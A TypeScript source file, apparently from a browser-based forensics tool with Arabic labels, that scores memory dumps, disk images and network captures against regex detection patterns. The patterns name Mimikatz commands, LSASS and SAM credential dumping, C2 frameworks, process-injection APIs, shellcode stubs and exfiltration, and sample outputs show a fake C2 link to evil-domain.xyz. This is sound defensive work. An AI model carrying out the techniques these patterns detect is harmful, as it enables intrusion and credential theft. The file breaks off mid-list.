/* eslint-disable */
// @ts-nocheck
/**
 * DFAS Forensics Engines — Advanced Analysis Modules v1.0
 * ══════════════════════════════════════════════════════════════
 * MOD-11  MemoryEngine   — الطب الشرعي للذاكرة  (Volatility3-inspired)
 * MOD-12  DiskEngine     — محلل صور الأقراص     (The Sleuth Kit-inspired)
 * MOD-13  PcapEngine     — محلل حركة الشبكة    (Tshark/Wireshark-inspired)
 * MOD-14  EndpointEngine — تحليل نقاط النهاية  (Velociraptor-inspired)
 * ══════════════════════════════════════════════════════════════
 * NOTE: These engines run entirely in the browser (no backend required).
 *       They analyze text output, binary file headers, and structured logs.
 *       They implement the *detection logic* of these tools for forensic analysis.
 * ══════════════════════════════════════════════════════════════
 */
'use strict';

// ═══════════════════════════════════════════════════════════════
// MOD-11 — MEMORY FORENSICS ENGINE (Volatility3-inspired)
// محرك الطب الشرعي للذاكرة
// ═══════════════════════════════════════════════════════════════
export const MemoryEngine = (() => {

  // ── Suspicious Process Names (common masquerading / hollowing targets) ──
  const LEGIT_SYSTEM_PROCESSES = new Set([
    'system', 'smss.exe', 'csrss.exe', 'wininit.exe', 'winlogon.exe',
    'services.exe', 'lsass.exe', 'svchost.exe', 'lsm.exe', 'explorer.exe',
    'spoolsv.exe', 'taskhost.exe', 'taskhostw.exe', 'dwm.exe', 'conhost.exe',
    'dllhost.exe', 'msdtc.exe', 'wlms.exe', 'searchindexer.exe',
  ]);

  // Masqueraded process names (typosquatting system processes)
  const MASQUERADE_PATTERNS = [
    { re: /\bsvch0st\.exe\b/i,        label: 'svchost.exe مزيّف (svch0st)' },
    { re: /\bsvchost32\.exe\b/i,      label: 'svchost.exe مزيّف (svchost32)' },
    { re: /\bsvhost\.exe\b/i,         label: 'svchost.exe مزيّف (svhost)' },
    { re: /\blssas\.exe\b/i,          label: 'lsass.exe مزيّف (lssas)' },
    { re: /\blsas\.exe\b/i,           label: 'lsass.exe مزيّف (lsas)' },
    { re: /\bexplorer32\.exe\b/i,     label: 'explorer.exe مزيّف (explorer32)' },
    { re: /\bcsrsss\.exe\b/i,         label: 'csrss.exe مزيّف (csrsss)' },
    { re: /\bwi[n]logon\.exe\b/i,     label: 'winlogon.exe — يجب فحص سياقه' },
    { re: /\btaskm[gq]r\.exe\b/i,     label: 'taskmgr.exe مزيّف' },
    { re: /\bsmss32\.exe\b/i,         label: 'smss.exe مزيّف (smss32)' },
    { re: /\biexplore\.exe\b/i,       label: 'Internet Explorer — مستخدم كغطاء للـ C2 أحياناً' },
    { re: /\brundll32\.exe\b/i,       label: 'rundll32.exe — شائع في هجمات LOLBin' },
    { re: /\bregsvr32\.exe\b/i,       label: 'regsvr32.exe — شائع في تجاوز Application Whitelisting' },
    { re: /\bmshta\.exe\b/i,          label: 'mshta.exe — تنفيذ HTA خبيث محتمل' },
    { re: /\bwscript\.exe\b/i,        label: 'wscript.exe — تنفيذ VBScript/JScript' },
    { re: /\bcscript\.exe\b/i,        label: 'cscript.exe — سكريبت نصي مشبوه' },
    { re: /\bcertutil\.exe\b/i,       label: 'certutil.exe — يُستخدم لتنزيل Payloads' },
    { re: /\bbitsadmin\.exe\b/i,      label: 'bitsadmin.exe — LOLBin للتنزيل' },
    { re: /\bnotepad\+\+\.exe\b/i,    label: 'Notepad++ في ذاكرة النظام — غير مألوف' },
  ];

  // ── Cobalt Strike / Meterpreter / Common RAT Artifacts ──
  const MALWARE_ARTIFACTS = [
    { re: /\bcobaltstrike\b|\bbeacon\.dll\b|\bbeacon\.x64\.dll\b/i, sev: 'CRITICAL', label: 'Cobalt Strike Beacon artifact' },
    { re: /\bmeterpreter\b|\breverse_tcp\b|\breverse_https\b/i,     sev: 'CRITICAL', label: 'Metasploit Meterpreter artifact' },
    { re: /\bmimikat[sz]\b|\bmimidrv\b/i,                           sev: 'CRITICAL', label: 'Mimikatz — أداة سرقة بيانات الاعتماد' },
    { re: /\bprocmon\b.*lsass|lsass.*\bprocmon\b/i,                 sev: 'CRITICAL', label: 'مراقبة LSASS — استخراج كلمات مرور محتمل' },
    { re: /sekurlsa::|lsadump::|kerberos::/i,                        sev: 'CRITICAL', label: 'أوامر Mimikatz نشطة في الذاكرة' },
    { re: /\bempire\b|\bpowerempire\b|\bpsbind\b/i,                  sev: 'CRITICAL', label: 'PowerShell Empire — C2 Framework' },
    { re: /\bAsyncRAT\b|\bDarkComet\b|\bNjRAT\b|\bQuasar\b/i,        sev: 'CRITICAL', label: 'RAT معروف في الذاكرة' },
    { re: /\bLockBit\b|\bREvil\b|\bBlackCat\b|\bConti\b/i,           sev: 'CRITICAL', label: 'مجموعة Ransomware في الذاكرة' },
    { re: /\bWannaCry\b|\bNotPetya\b|\bRyuk\b/i,                      sev: 'CRITICAL', label: 'Ransomware معروف — إصابة حرجة' },
    { re: /\bcobalt.*strike|stage.*payload|staged.*payload/i,         sev: 'CRITICAL', label: 'Staged Payload — Cobalt Strike نمطي' },
    { re: /\bsliver\b.*\b(implant|beacon|c2)\b/i,                     sev: 'CRITICAL', label: 'Sliver C2 Framework' },
    { re: /\bbrute\s*ratel\b/i,                                       sev: 'CRITICAL', label: 'Brute Ratel C4 — أداة اختراق متطورة' },
  ];

  // ── Memory Injection Techniques ──
  const INJECTION_PATTERNS = [
    { re: /VirtualAllocEx|WriteProcessMemory|CreateRemoteThread/i,    sev: 'CRITICAL', label: 'Process Injection API Triad — حقن كلاسيكي' },
    { re: /NtCreateSection|NtMapViewOfSection|NtUnmapViewOfSection/i, sev: 'CRITICAL', label: 'Process Hollowing APIs — استبدال الذاكرة' },
    { re: /QueueUserAPC|SetWindowsHookEx/i,                           sev: 'HIGH',     label: 'APC Injection / Hook Injection APIs' },
    { re: /\bLoadLibrary[AW]?\s*\(\s*"[^"]{0,6}\\\\[^"]+"\s*\)/i,    sev: 'HIGH',     label: 'DLL حقن من مسار مشبوه' },
    { re: /NtWriteVirtualMemory|RtlCopyMemory.*Alloc/i,               sev: 'HIGH',     label: 'استدعاء كتابة ذاكرة مباشر' },
    { re: /\bOpenProcess\b.*\bVirtualAlloc/i,                          sev: 'HIGH',     label: 'OpenProcess → VirtualAlloc — نمط حقن' },
    { re: /\bCreateProcessWithLogon\b|\bToken\s*Impersonation\b/i,    sev: 'HIGH',     label: 'Token Impersonation — رفع الصلاحيات' },
  ];

  // ── Suspicious Memory Regions (Volatility malfind-like) ──
  const MEMORY_ANOMALIES = [
    { re: /PAGE_EXECUTE_READWRITE|MEM_PRIVATE.*EXECUTE/i,            sev: 'HIGH',   label: 'منطقة ذاكرة RWX — مؤشر Shellcode' },
    { re: /\[HEAP\].*executable|\[STACK\].*executable/i,             sev: 'HIGH',   label: 'Heap/Stack قابل للتنفيذ — شاذ جداً' },
    { re: /\bmalfind\b.*VAD\s+\d+:\s+0x[0-9a-f]+ MZ/i,             sev: 'CRITICAL', label: 'MZ Header في ذاكرة غير مرتبطة — Process Injection' },
    { re: /Vad\s+Tag:.*VadS.*Execute/i,                              sev: 'HIGH',   label: 'VAD شاذ قابل للتنفيذ — Volatility malfind' },
    { re: /0x[0-9a-f]{8,}\s+MZ\x50\x45/i,                           sev: 'CRITICAL', label: 'PE Header مُخفى في الذاكرة' },
    { re: /\bshellcode\b|\bsignal\s*bytes\b/i,                        sev: 'CRITICAL', label: 'Shellcode signature' },
  ];

  // ── Credential Theft Indicators ──
  const CRED_PATTERNS = [
    { re: /lsass\.exe.*\bOpen\b.*PROCESS_ALL_ACCESS/i,               sev: 'CRITICAL', label: 'LSASS memory dump attempt' },
    { re: /\bsam\b.*\bhive\b|\bntds\.dit\b/i,                        sev: 'CRITICAL', label: 'SAM/NTDS.dit access — hash dumping' },
    { re: /\bwce\.exe\b|\bfgdump\b|\bpwdump\b/i,                     sev: 'CRITICAL', label: 'Credential Dumping Tool في الذاكرة' },
    { re: /password\s*=\s*"[^"]+"|passwd\s*:\s*\S+/i,                sev: 'HIGH',     label: 'كلمة مرور نص صريح في الذاكرة' },
    { re: /\bntlm\s*hash\b|\blm\s*hash\b|\bkerberos\s*ticket\b/i,   sev: 'HIGH',     label: 'NTLM/LM/Kerberos artifact في الذاكرة' },
    { re: /runas.*\/savecred|cmdkey.*\/add/i,                         sev: 'HIGH',     label: 'Credential caching command' },
  ];

  // ── Network Artifacts in Memory ──
  const NETWORK_IN_MEMORY = [
    { re: /ESTABLISHED\s+(\d{1,3}\.){3}\d{1,3}:\d+\s+(\d{1,3}\.){3}\d{1,3}:(443|80|8080|4444|8443|1337|31337)/i, sev: 'HIGH',     label: 'اتصال شبكي نشط عبر منفذ مشبوه' },
    { re: /\b4444\b|\b31337\b|\b1337\b|\b8888\b/,                    sev: 'HIGH',     label: 'منفذ شائع في أدوات الاختراق (4444/31337)' },
    { re: /dns.*\.(onion|i2p)\b/i,                                    sev: 'CRITICAL', label: 'اتصال Tor/I2P في الذاكرة' },
    { re: /\braw\s*socket\b|\bWSASocket\b.*SOCK_RAW/i,               sev: 'HIGH',     label: 'Raw Socket — قد يشير إلى sniffer أو C2' },
  ];

  // ── Volatility Plugin Output Patterns ──
  const VOLATILITY_OUTPUT = [
    { re: /Volatility\s+Foundation|volatility\d*\.\d+/i,             label: 'Volatility output detected', info: true },
    { re: /pslist|pstree|cmdline|dlllist|handles|netscan|malfind/i,  label: 'Volatility plugin output', info: true },
    { re: /Offset\(V\)\s+Name\s+PID\s+PPID/i,                        label: 'pslist output — قائمة العمليات' },
    { re: /(\w+\.exe)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+\d+\s+\d+/,label: 'Process entry من Volatility' },
  ];

  // ── PE / Shellcode Binary Signatures (text representation) ──
  const PE_SIGNATURES = [
    { re: /4d5a90|4d5a50|MZ\x90\x00|\\x4d\\x5a/i,   sev: 'HIGH',   label: 'PE/MZ Header في الذاكرة' },
    { re: /\\xfc\\xe8\\x89|\\xfc\\xe8\\x82/i,         sev: 'CRITICAL', label: 'Meterpreter shellcode stub' },
    { re: /\\x31\\xc0\\x50\\x68|\\x31\\xdb\\x53/i,   sev: 'HIGH',   label: 'x86 Shellcode NOP-like pattern' },
    { re: /VTVJRQAA|4141414141|AAAAAAAAAA/,            sev: 'MEDIUM', label: 'Buffer overflow pattern في الذاكرة' },
  ];

  function analyze(input: string) {
    const findings = [];
    let score = 0;

    const check = (patterns, sev_override?: string) => {
      for (const p of patterns) {
        if (p.re.test(input)) {
          const sev = sev_override || p.sev || 'MEDIUM';
          findings.push({ sev, label: p.label, det: `نمط مكتشف: ${p.re.source.slice(0, 60)}`, ev: (input.match(p.re) || [''])[0].slice(0, 100) });
          score += { CRITICAL: 10, HIGH: 6, MEDIUM: 3, LOW: 1, INFO: 0 }[sev] || 0;
        }
      }
    };

    check(MASQUERADE_PATTERNS);
    check(MALWARE_ARTIFACTS);
    check(INJECTION_PATTERNS);
    check(MEMORY_ANOMALIES);
    check(CRED_PATTERNS);
    check(NETWORK_IN_MEMORY);
    check(PE_SIGNATURES);

    // Info-only Volatility output detection
    let isVolatilityOutput = false;
    for (const p of VOLATILITY_OUTPUT) {
      if (p.re.test(input)) {
        isVolatilityOutput = true;
        break;
      }
    }

    // ── Heuristic: Process Parent Anomaly Detection ──
    const processLines = input.match(/\b\w+\.exe\s+\d+\s+\d+/g) || [];
    const multipleSystemProcs = processLines.filter(l => LEGIT_SYSTEM_PROCESSES.has(l.split(/\s+/)[0]?.toLowerCase())).length;
    if (multipleSystemProcs > 8) {
      findings.push({ sev: 'INFO', label: `${multipleSystemProcs} عملية نظام في الذاكرة — يبدو Volatility pslist`, det: 'يُنصح بالتحقق من PPID لكل عملية', ev: '' });
    }

    // ── Heuristic: Suspicious command lines ──
    const cmdlines = input.match(/cmd\.exe.*\/c.{10,80}|powershell.*-enc\s+[A-Za-z0-9+/=]{20,}/ig) || [];
    cmdlines.forEach(cmd => {
      score += 8;
      findings.push({ sev: 'HIGH', label: 'سطر أوامر مشبوه في الذاكرة', det: 'تنفيذ أوامر obfuscated أو encoded', ev: cmd.slice(0, 120) });
    });

    // ── Heuristic: Base64 encoded payloads in memory ──
    const b64Blobs = input.match(/[A-Za-z0-9+/]{100,}={0,2}/g) || [];
    if (b64Blobs.length >= 2) {
      score += 5;
      findings.push({ sev: 'MEDIUM', label: `${b64Blobs.length} كتلة Base64 في الذاكرة`, det: 'محتوى مُشفر — قد يخفي shellcode أو payload', ev: b64Blobs[0].slice(0, 60) + '…' });
    }

    const pct = Math.min(Math.round((score / 60) * 100), 99);
    const threat = pct >= 70 ? 'crit' : pct >= 35 ? 'warn' : 'safe';

    return {
      pct, threat, findings,
      isVolatilityOutput,
      processCount: processLines.length,
      stats: {
        totalFindings: findings.length,
        critical: findings.filter(f => f.sev === 'CRITICAL').length,
        high: findings.filter(f => f.sev === 'HIGH').length,
        injectionIndicators: findings.filter(f => f.label?.includes('Injection') || f.label?.includes('Hollow')).length,
      }
    };
  }

  const SAMPLE = `Volatility Foundation Volatility Framework 3.0
PID   PPID  Name               Offset    Threads  Handles
4     0     System             0x823c89c8  53      240
264   4     smss.exe           0x820dfda0   3       19
332   264   csrss.exe          0x8205bda0  10      335
380   264   winlogon.exe       0x81e2bda0  23      536
428   380   services.exe       0x820ecda0  15      265
440   380   lsass.exe          0x820f0da0  21      330
1484  428   svchost.exe        0x82311480  14      198
1740  428   svch0st.exe        0x81f44da0  11       82   <-- SUSPICIOUS
2096  428   explorer.exe       0x821f4da0  16      415

Network Connections (netscan):
Offset     Proto  Local Address          Foreign Address          State
0x1f2c3da0  TCP    192.168.1.10:49234    185.220.101.45:4444     ESTABLISHED
0x1f2c1020  TCP    192.168.1.10:50912    evil-domain.xyz:443     ESTABLISHED

MalFind Results:
Process: svch0st.exe (1740)
VAD: 0x00400000 - 0x00410000, Tag: VadS, Protection: PAGE_EXECUTE_READWRITE
Hexdump: 4d 5a 90 00 03 00 00 00  (MZ Header found in unlinked memory!)

sekurlsa::logonpasswords detected in memory string
WriteProcessMemory → CreateRemoteThread sequence found`;

  return { analyze, SAMPLE };
})();


// ═══════════════════════════════════════════════════════════════
// MOD-12 — DISK IMAGE ANALYZER (The Sleuth Kit-inspired)
// محلل صور الأقراص والأنظمة الملفاتية
// ═══════════════════════════════════════════════════════════════
export const DiskEngine = (() => {

  // ── Filesystem Magic Bytes (hex patterns) ──
  const FS_SIGNATURES = [
    { magic: [0xEB, 0x58, 0x90],                          fs: 'NTFS',          label: 'NTFS filesystem (Windows)' },
    { magic: [0xEB, 0x52, 0x90],                          fs: 'FAT32',         label: 'FAT32 filesystem' },
    { magic: [0xEB, 0x3C, 0x90],                          fs: 'FAT16',         label: 'FAT16 filesystem' },
    { magic: [0x53, 0xEF],        offset: 0x438,          fs: 'ext2/3/4',      label: 'Linux ext filesystem (offset 0x438)' },
    { magic: [0xAA, 0x55],        offset: 0x1FE,          fs: 'MBR',           label: 'MBR Boot Signature (0xAA55)' },
    { magic: [0x45, 0x46, 0x49, 0x20, 0x50, 0x41, 0x52, 0x54], offset: 0x200, fs: 'GPT', label: 'GPT Partition Table Header' },
    { magic: [0x45, 0x56, 0x46],                          fs: 'E01',           label: 'EnCase Evidence File (E01)' },
    { magic: [0x45, 0x57, 0x46, 0x32],                    fs: 'EX01',          label: 'EnCase Evidence File v2 (EX01)' },
    { magic: [0x41, 0x46, 0x46],                          fs: 'AFF',           label: 'Advanced Forensic Format (AFF)' },
    { magic: [0x4C, 0x56, 0x46],                          fs: 'LVM',           label: 'Logical Volume Manager (Linux LVM)' },
    { magic: [0x52, 0x61, 0x72, 0x21, 0x1A, 0x07],       fs: 'RAR',           label: 'RAR archive — قد يكون ملف disk مضغوط' },
    { magic: [0x50, 0x4B, 0x03, 0x04],                   fs: 'ZIP',           label: 'ZIP archive — قد يكون ملف disk مضغوط' },
  ];

  // ── Forensic Artifacts in Disk Text Output ──
  const DISK_ARTIFACTS = [
    // Anti-forensic tools
    { re: /\beraser\b|\bsecurecrt\b|\bcc?leaner\b|\bfri[cs]h\b/i,     sev: 'HIGH',     label: 'أداة مسح أدلة جنائية' },
    { re: /\bsdelete\b|\bcipher\s*\/w\b|\bwipe\b/i,                    sev: 'HIGH',     label: 'أداة حذف آمن (إخفاء الأدلة)' },
    { re: /timestomp|$SI.*creation.*$FN/i,                              sev: 'CRITICAL', label: 'Timestomping — تلاعب في أختام NTFS الزمنية' },
    { re: /\$MFT|\$BITMAP|\$LOGFILE|\$USNJRNL/i,                       sev: 'INFO',     label: 'NTFS Metafiles — بنية NTFS مكتشفة' },
    // Deleted file recovery indicators
    { re: /\borphan\b|\binode.*deleted\b|file_recovered/i,             sev: 'MEDIUM',   label: 'ملفات محذوفة قابلة للاسترداد' },
    { re: /unallocated\s+space|slack\s+space/i,                        sev: 'MEDIUM',   label: 'Slack/Unallocated space — مناطق مخفية محتملة' },
    // Windows artifact paths
    { re: /System32\\winevt\\Logs|evtx\b/i,                            sev: 'INFO',     label: 'Windows Event Logs مكتشف' },
    { re: /NTUSER\.DAT|Software\\Microsoft\\Windows\\CurrentVersion/i, sev: 'INFO',     label: 'Registry Hive مكتشف' },
    { re: /pagefile\.sys|hiberfil\.sys|swapfile\.sys/i,                 sev: 'INFO',     label: 'ملف ذاكرة Windows — قد يحتوي على بيانات حساسة' },
    { re: /\$Recycle\.Bin|\bRec[yy]cl[e]r\b/i,                        sev: 'INFO',     label: 'سلة المحذوفات — ملفات قد تكون أُخفيت' },
    { re: /Prefetch\\.*\.pf\b/i,                                        sev: 'INFO',     label: 'Windows Prefetch — سجل تنفيذ البرامج' },
    { re: /AppData\\Roaming\\Microsoft\\Windows\\Recent/i,              sev: 'INFO',     label: 'MRU (Recently Used Files) list' },
    { re: /SAM\b|SECURITY\b|SOFTWARE\b|SYSTEM\b.*hive/i,               sev: 'HIGH',     label: 'Registry Security Hives — بيانات اعتماد محتملة' },
    // Linux artifact paths
    { re: /\/etc\/passwd|\/etc\/shadow/i,                               sev: 'HIGH',     label: 'ملفات بيانات الاعتماد Linux' },
    { re: /\/var\/log\/auth\.log|\/var\/log\/syslog/i,                  sev: 'INFO',     label: 'سجلات Linux — مصدر أدلة جنائية' },
    { re: /\/proc\/\d+\/maps|\/proc\/\d+\/exe/i,                        sev: 'INFO',     label: 'Linux /proc filesystem artifacts' },
    // Suspicious hidden files
    { re: /\.\w+\.(exe|dll|sys|bin|vbs|ps1|bat)$/im,                   sev: 'HIGH',     label: 'ملف مخفي بامتداد تنفيذي مشبوه' },
    { re: /alternate\s+data\s+stream|ADS\b/i,                          sev: 'HIGH',     label: 'NTFS Alternate Data Stream — إخفاء بيانات' },
    // Partition anomalies
    { re: /partition.*overlap|unallocated.*between/i,                   sev: 'HIGH',     label: 'تداخل أقسام — قد يشير إلى قسم مخفي' },
    { re: /boot\s+sector.*modified|MBR.*changed/i,                     sev: 'CRITICAL', label: 'تعديل Boot Sector — Bootkit محتمل' },
  ];

  // ── TSK-like output patterns ──
  const TSK_OUTPUT_PATTERNS = [
    { re: /fls\s+\-[a-z]+|ils\s+\-[a-z]+|istat\s+/i, label: 'TSK (fls/ils/istat) output' },
    { re: /mmls\s+|fsstat\s+/i,                         label: 'TSK partition/filesystem stats' },
    { re: /Type:\s+(NTFS|FAT|ext[234]|HFS)/i,           label: 'Filesystem type from TSK' },
    { re: /Inode\s+Number:\s+\d+/i,                     label: 'TSK inode listing' },
  ];

  // Analyze binary file (Uint8Array)
  function analyzeBinary(bytes: Uint8Array) {
    const findings = [];
    let detectedFS = 'Unknown';

    for (const sig of FS_SIGNATURES) {
      const offset = sig.offset || 0;
      if (bytes.length > offset + sig.magic.length) {
        const match = sig.magic.every((b, i) => bytes[offset + i] === b);
        if (match) {
          detectedFS = sig.fs;
          findings.push({ sev: 'INFO', label: sig.label, det: `Magic bytes at offset 0x${offset.toString(16).toUpperCase()}`, ev: sig.magic.map(b => b.toString(16).padStart(2, '0')).join(' ') });
        }
      }
    }

    // MBR analysis (first 512 bytes)
    if (bytes.length >= 512) {
      const mbrSig = bytes[510] === 0xAA && bytes[511] === 0x55;
      if (mbrSig) {
        findings.push({ sev: 'INFO', label: 'MBR signature valid (0xAA55)', det: 'القرص يحتوي على MBR صحيح — يمكن تحليل جدول الأقسام', ev: '' });

        // Check partition table (MBR entries at 0x1BE)
        const partitionCount = [0x1BE, 0x1CE, 0x1DE, 0x1EE].filter(offset => bytes[offset + 4] !== 0).length;
        if (partitionCount > 0) {
          findings.push({ sev: 'INFO', label: `${partitionCount} قسم(أقسام) في جدول MBR`, det: 'Partition table entries detected', ev: '' });
        }

        // Hidden partition heuristic
        const typeBytes = [bytes[0x1BE + 4], bytes[0x1CE + 4], bytes[0x1DE + 4], bytes[0x1EE + 4]];
        if (typeBytes.includes(0x05) || typeBytes.includes(0x0F)) {
          findings.push({ sev: 'MEDIUM', label: 'Extended Partition مكتشف', det: 'قسم ممتد — يحتوي على logical partitions', ev: '' });
        }
        if (typeBytes.includes(0xDE) || typeBytes.includes(0xAB)) {
          findings.push({ sev: 'HIGH', label: 'قسم Dell/Apple OEM خاص', det: 'قسم غير قياسي — قد يحتوي على بيانات مخفية', ev: '' });
        }
      }

      // Check for GPT
      const gptMagic = [0x45, 0x46, 0x49, 0x20, 0x50, 0x41, 0x52, 0x54];
      if (bytes.length >= 0x200 + 8 && gptMagic.every((b, i) => bytes[0x200 + i] === b)) {
        findings.push({ sev: 'INFO', label: 'GPT Partition Table مكتشف', det: 'GUID Partition Table — حديث وأكثر أماناً من MBR', ev: '' });
      }
    }

    // Entropy analysis for first 4KB
    const sampleSize = Math.min(4096, bytes.length);
    const freq = new Array(256).fill(0);
    for (let i = 0; i < sampleSize; i++) freq[bytes[i]]++;
    const entropy = -freq.reduce((acc, c) => { if (c === 0) return acc; const p = c / sampleSize; return acc + p * Math.log2(p); }, 0);

    if (entropy > 7.5) {
      findings.push({ sev: 'HIGH', label: `إنتروبيا عالية جداً: ${entropy.toFixed(2)} bits`, det: 'القرص/الملف قد يكون مُشفراً (BitLocker, VeraCrypt, etc.)', ev: '' });
    } else if (entropy > 7.0) {
      findings.push({ sev: 'MEDIUM', label: `إنتروبيا مرتفعة: ${entropy.toFixed(2)} bits`, det: 'قد يكون مضغوطاً أو مُشفراً جزئياً', ev: '' });
    } else {
      findings.push({ sev: 'INFO', label: `إنتروبيا طبيعية: ${entropy.toFixed(2)} bits`, det: 'محتوى غير مُشفر — نظام ملفات عادي محتمل', ev: '' });
    }

    return { findings, detectedFS, entropy };
  }

  function analyzeText(input: string) {
    const findings = [];
    let score = 0;

    for (const pattern of DISK_ARTIFACTS) {
      if (pattern.re.test(input)) {
        findings.push({ sev: pattern.sev, label: pattern.label, det: `نمط مكتشف`, ev: (input.match(pattern.re) || [''])[0].slice(0, 100) });
        score += { CRITICAL: 10, HIGH: 6, MEDIUM: 3, LOW: 1, INFO: 0 }[pattern.sev] || 0;
      }
    }

    let isTSKOutput = false;
    for (const p of TSK_OUTPUT_PATTERNS) {
      if (p.re.test(input)) { isTSKOutput = true; break; }
    }

    return { findings, score, isTSKOutput };
  }

  async function analyze(fileOrText: File | string) {
    if (typeof fileOrText === 'string') {
      const textResult = analyzeText(fileOrText);
      const pct = Math.min(Math.round((textResult.score / 50) * 100), 99);
      return {
        pct, threat: pct >= 65 ? 'crit' : pct >= 35 ? 'warn' : 'safe',
        findings: textResult.findings,
        isTSKOutput: textResult.isTSKOutput,
        detectedFS: 'نص (Text Input)',
        stats: { totalFindings: textResult.findings.length }
      };
    }

    const buffer = await fileOrText.arrayBuffer();
    const bytes = new Uint8Array(buffer);
    const binResult = analyzeBinary(bytes);

    // Also analyze filename and any embedded text strings (ASCII extraction)
    const textDecoder = new TextDecoder('ascii', { fatal: false });
    const rawText = textDecoder.decode(bytes.slice(0, Math.min(65536, bytes.length)));
    const printable = rawText.replace(/[^\x20-\x7E\n\r]/g, ' ');
    const textResult = analyzeText(printable);

    const allFindings = [...binResult.findings, ...textResult.findings];
    const score = allFindings.reduce((acc, f) => acc + ({ CRITICAL: 10, HIGH: 6, MEDIUM: 3, LOW: 1, INFO: 0 }[f.sev] || 0), 0);
    const pct = Math.min(Math.round((score / 60) * 100), 99);

    return {
      pct, threat: pct >= 65 ? 'crit' : pct >= 35 ? 'warn' : 'safe',
      findings: allFindings,
      detectedFS: binResult.detectedFS,
      entropy: binResult.entropy,
      fileSize: bytes.length,
      stats: {
        totalFindings: allFindings.length,
        critical: allFindings.filter(f => f.sev === 'CRITICAL').length,
        high: allFindings.filter(f => f.sev === 'HIGH').length,
      }
    };
  }

  const SAMPLE = `TSK (The Sleuth Kit) Analysis Output:

mmls output — Disk Image: suspect_disk.img
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000206847   0000204800   Linux (0x83)
003:  000:001   0000206848   0000411647   0000204800   Linux Swap (0x82)
004:  -------   0000411648   0000419429   0000007782   Unallocated

fsstat output:
Type: NTFS
Version: Windows XP
Volume Name: WINDOWS
Volume Serial Number: A1B2C3D4
OEM Name: NTFS
$MFT Start Cluster: 2
$MFTMirr Start Cluster: 96

Deleted files found:
r/r * 32456:  passwords.txt   (ORPHAN)
r/r * 32457:  credit_cards.xlsx (deleted)
Timestomping detected: $SI creation != $FN creation
SAM hive found at: C:\\Windows\\System32\\config\\SAM
sdelete artifacts found — secure deletion attempted
ADS (Alternate Data Stream) detected on: setup.exe:hidden.dat`;

  return { analyze, SAMPLE };
})();


// ═══════════════════════════════════════════════════════════════
// MOD-13 — PCAP / NETWORK TRAFFIC ANALYZER (Tshark-inspired)
// محلل حركة الشبكة وملفات PCAP
// ═══════════════════════════════════════════════════════════════
export const PcapEngine = (() => {

  // ── PCAP Magic Bytes ──
  const PCAP_MAGIC = {
    0xD4C3B2A1: 'pcap (little-endian)',
    0xA1B2C3D4: 'pcap (big-endian)',
    0x0A0D0D0A: 'pcapng',
  };

  // ── Known Malicious IPs (Tor exits, C2 servers, known bad) ──
  const KNOWN_BAD_IPS = new Set([
    '185.220.101.45', '185.220.101.34', '185.220.100.252', '185.220.100.240',
    '193.32.162.157', '91.108.4.157', '45.142.212.100', '89.234.157.254',
    '199.249.230.69', '176.10.99.200', '104.244.72.7', '162.247.72.201',
  ]);

  // ── C2 Beacon Detection Heuristics ──
  const BEACON_PATTERNS = [
    { re: /GET\s+\/[a-zA-Z0-9_\-]{1,20}\s+HTTP\/1\.[01]\r?\nHost:\s+\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/im, sev: 'HIGH', label: 'HTTP GET إلى IP مباشر — C2 beacon محتمل' },
    { re: /User-Agent:\s*Mozilla\/5\.0\s*\(\s*compatible;\s*\)/i, sev: 'HIGH', label: 'User-Agent مزيّف/فارغ — bot/C2 مشبوه' },
    { re: /User-Agent:\s*(curl|wget|python-requests|go-http|Nmap|masscan)/i, sev: 'HIGH', label: 'User-Agent أداة هجوم/scanning' },
    { re: /Content-Length:\s*0\b.*\bPOST\b|\bPOST\b.*Content-Length:\s*0\b/i, sev: 'MEDIUM', label: 'POST بمحتوى فارغ — heartbeat C2 محتمل' },
    { re: /interval.*\b(60|120|240|300|600)\b.*seconds|sleep.*\b(60|120|300)\b/i, sev: 'HIGH', label: 'Beacon interval منتظم — نمط C2' },
    { re: /\.(onion|i2p)\b/i, sev: 'CRITICAL', label: 'اتصال Tor/I2P في حركة الشبكة' },
    { re: /CONNECT\s+\S+:443\s+HTTP/i, sev: 'HIGH', label: 'HTTP CONNECT tunneling — C2 عبر HTTPS' },
  ];

  // ── DNS Tunneling Detection ──
  const DNS_TUNNEL_PATTERNS = [
    { re: /query\s+\w{20,}\.\w{3,}\s+(A|AAAA|TXT)/i,   sev: 'HIGH',     label: 'DNS query لاسم طويل — DNS Tunneling محتمل' },
    { re: /TXT\s+"[A-Za-z0-9+/]{30,}={0,2}"/i,          sev: 'CRITICAL', label: 'DNS TXT record مع Base64 — DNS Tunneling نشط' },
    { re: /\b(iodine|dnscat|dns2tcp|ozymandns)\b/i,     sev: 'CRITICAL', label: 'أداة DNS Tunneling معروفة' },
    { re: /NXDOMAIN.*rate.*\d{2,}\/s/i,                  sev: 'HIGH',     label: 'معدل NXDOMAIN مرتفع — DGA أو DNS Tunneling' },
    { re: /dns.*entropy.*[7-9]\.\d/i,                    sev: 'HIGH',     label: 'إنتروبيا DNS مرتفعة — اسم نطاق مولَّد' },
  ];

  // ── Data Exfiltration Indicators ──
  const EXFIL_PATTERNS = [
    { re: /upload.*\d+\s*MB|\d+\s*MB.*upload/i,                          sev: 'HIGH', label: 'رفع بيانات كبير — تسريب محتمل' },
    { re: /outbound.*bytes.*[1-9]\d{6,}|[1-9]\d{6,}.*outbound.*bytes/i, sev: 'HIGH', label: 'بيانات صادرة كبيرة الحجم' },
    { re: /POST\s+\/+[a-z0-9]+\s+HTTP.*Content-Length:\s*[1-9]\d{4,}/im, sev: 'HIGH', label: 'HTTP POST بحجم كبير — تسريب محتمل' },
    { re: /ftp.*put\s+\S+\.(zip|rar|gz|7z|tar)/i,                        sev: 'HIGH', label: 'FTP upload لملف مضغوط' },
    { re: /smb.*write.*\$\s*admin|ipc\$.*upload/i,                       sev: 'CRITICAL', label: 'SMB upload إلى مشاركة إدارية' },
  ];

  // ── Lateral Movement Patterns ──
  const LATERAL_MOVEMENT = [
    { re: /psexec|wmiexec|smbexec|atexec/i,                              sev: 'CRITICAL', label: 'Lateral Movement tool مكتشف (PsExec/WMIExec)' },
